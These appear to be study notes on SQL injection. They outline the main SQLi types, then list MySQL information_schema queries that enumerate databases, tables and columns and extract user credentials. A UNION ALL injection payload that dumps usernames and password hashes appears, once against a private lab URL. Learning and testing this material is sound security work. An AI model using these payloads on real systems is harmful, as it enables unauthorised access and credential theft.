# Types of SQL Injections (SQLi)

SQL Injection (SQLi) is one of the most common web security vulnerabilities that allows attackers to interfere with queries made to a database. Different types of SQL injections depend on how attackers extract or manipulate information.

---

## In-band SQLi

In-band SQLi is the **most straightforward and frequent technique**. The attacker uses the same communication channel to both inject malicious SQL queries and retrieve results.

### Error-based SQLi

- Exploits database error messages to gain information about database structure.
- For example, attackers intentionally write invalid queries to reveal table names, column names, or data types from verbose errors.
- Effective if the database is configured to display detailed error messages.

### Union-based SQLi

- Exploits the `UNION` operator to combine results of legitimate queries with malicious `SELECT` statements.
- Example: retrieving usernames, passwords, or emails in the same HTTP response.
- Relies heavily on being able to guess the correct number and types of columns in the query.

---

## Blind SQLi

Blind SQLi is used when the database does not return error messages or direct query outputs. Attackers must infer information indirectly from the application's behavior, making it **slower but stealthier**.

### Boolean-based SQLi

- Attackers craft queries so the application responds differently depending on whether a condition is **TRUE** or **FALSE**.
- Example: a page might display different content if a query condition is true (data exists) versus false (no data).
- Information is extracted one piece at a time.

### Time-based SQLi

- Exploits SQL functions that delay execution (e.g., `SLEEP()` or `WAITFOR DELAY`).
- Attackers detect whether a query result is true or false by measuring server response time.
- Useful when no content differences appear in responses but timing can still be measured.

---

## Out-of-band SQLi

Out-of-band SQLi is used when in-band and blind SQLi are not possible, often due to unstable servers or limited query feedback.

- Relies on database features that allow generating **DNS or HTTP requests** to external servers.
- Data is exfiltrated via these requests to attacker-controlled systems.
- More rare, but effective with databases that allow outbound connections (e.g., Microsoft SQL Server with `xp_dirtree`, Oracle with `UTL_HTTP`).

---

# Using information_schema for SQL Injection

`information_schema` allows attackers to discover database organization without prior knowledge. Here's how attackers leverage it:

## Enumerating Databases

Attackers use these queries to list or enumerate the names of all databases:

```sql
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

- The first returns each database name individually.
- The second uses `GROUP_CONCAT` to get all database names in a single row.

---

## Enumerating Tables

To find all table names in a particular database (e.g., `mysql`):

```sql
SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';
SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';
```

- The condition `WHERE TABLE_SCHEMA='mysql'` restricts the results to only the specified database.
- `GROUP_CONCAT` conveniently returns all table names in one result.

---

## Enumerating Columns

Attackers identify column names in a specific table (e.g., `user` table in the `mysql` database):

```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';
SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';
```

- This is crucial for understanding which columns contain valuable data such as usernames or passwords.

---

## Extracting User Data

With knowledge of columns, attackers can extract user credentials:

```sql
SELECT User, authentication_string FROM mysql.user;
SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string) FROM mysql.user;
```

- These reveal all users and their password hashes (or authentication strings).

---

## Example: SQL Injection via Union and information_schema

A practical SQLi payload to list users and hashes using `UNION ALL`:

```sql
?id=-1' UNION ALL SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string), 3, 4, 5 FROM mysql.user--
```

- The specific number of columns (here "3, 4, 5") must match the original query's column count in the vulnerable application.

---

## Summary Table: Common Enumeration Queries

|Purpose|Example Query|
|---|---|
|List database names|`SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;`|
|List tables in a DB|`SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';`|
|List columns in a table|`SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='mysql' AND TABLE_NAME='user';`|
|Extract usernames & hashes|`SELECT User, authentication_string FROM mysql.user;`|
|All items as single row/value|`SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';`|

---

## Getting Database, Table, and Column Names

### Enumerate All Database Names:

```sql
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

---

**Note:** Exploiting `information_schema` is a fundamental step in SQL injection attacks, especially for privilege escalation or extracting sensitive data from a compromised server. The `information_schema` database is a critical resource for SQLi attackers because it reveals every other database, table, and column in MySQL. It enables enumeration of the database structure—essential for exploiting a SQL injection vulnerability.



# commands-
# Using information_schema for SQL Injection

`information_schema` allows attackers to discover database organization without prior knowledge. Here's how attackers leverage it:

## Common MySQL Enumeration Commands

```bash
mysql -u root -p
```

### Show all databases

```sql
show databases;
```

### Switch to a database (e.g. mysql)

```sql
use mysql;
```

### List tables in the current database

```sql
show tables;
```

### Get all users (for root access databases)

```sql
select * from user;
select user, authentication_string from user;
```

## Switch to information_schema database

```sql
use information_schema;
```

## List all tables in information_schema

```sql
select * from TABLES;
```

---

## Get All Database Names

```sql
select TABLE_SCHEMA from information_schema.TABLES;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 0,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 1,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 2,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 3,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 4,1;
```

```sql
select TABLE_SCHEMA from information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 5,1;
```

### Alternative: Get all database names at once

```sql
select group_concat(TABLE_SCHEMA) from information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

---

## Get All Table Names

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES;
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql";
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
```

```sql
select TABLE_SCHEMA, TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 1,1;
```

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
```

```sql
select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 30,1;
```

```sql
select TABLE_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" GROUP BY TABLE_NAME;
```

### Alternative: All tables as comma list

```sql
select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA="mysql";
```

---

## Get All Column Names

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="columns_priv";
```

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user" LIMIT 1,1;
```

```sql
select TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user" LIMIT 40,1;
```

### Alternative: All columns in one list

```sql
select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA="mysql" AND TABLE_NAME="user";
```

---

## Extract User Data

```sql
select User, authentication_string from mysql.user;
```

```sql
select User, authentication_string from mysql.user LIMIT 0,1;
```

```sql
select User from mysql.user LIMIT 1,1;
```

```sql
select group_concat(User) from mysql.user;
```

```sql
select group_concat(authentication_string) from mysql.user;
```

```sql
select group_concat(User), group_concat(authentication_string) from mysql.user;
```

---

## Example: SQL Injection Exploit with Union

```
http://192.168.1.20/webpen/sqli/error-based-string.php?id=-1' UNION ALL SELECT group_concat(User), group_concat(authentication_string), 3, 4, 5 FROM mysql.user--
```

---

## Enumerating Databases

**Attackers use these queries to list or enumerate the names of all databases:**

```sql
SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
```

### Switch to a custom/app database (example: armour_db)

```sql
use armour_db;
```